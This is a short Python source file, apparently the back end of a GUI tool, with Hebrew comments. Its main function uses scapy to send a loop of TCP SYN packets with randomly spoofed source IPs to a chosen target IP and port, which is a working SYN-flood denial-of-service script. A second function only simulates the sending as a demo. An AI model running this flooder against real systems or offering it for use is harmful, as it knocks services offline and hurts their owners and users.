from scapy.all import IP, TCP, RandIP, RandShort, send
import random
import time

# ביצוע התקפת SYN בפועל
def syn_flood(target_ip, target_port, packet_count, log_widget=None, stop_check=None):
    for i in range(packet_count):
        if stop_check and stop_check():
            break

        ip = IP(src=RandIP(), dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S", seq=random.randint(1000, 999999))
        packet = ip / tcp
        send(packet, verbose=False)

        if log_widget:
            log_widget.insert("end", f"Sending packet {i+1}/{packet_count}\n")
            log_widget.see("end")

# מצב דמו - הדמיה בלבד, ללא שליחה
def demo_mode(packet_count, log_widget=None, stop_check=None):
    for i in range(packet_count):
        if stop_check and stop_check():
            break
        time.sleep(0.05)
        if log_widget:
            log_widget.insert("end", f"(Demo) Packet {i+1}/{packet_count}\n")
            log_widget.see("end")
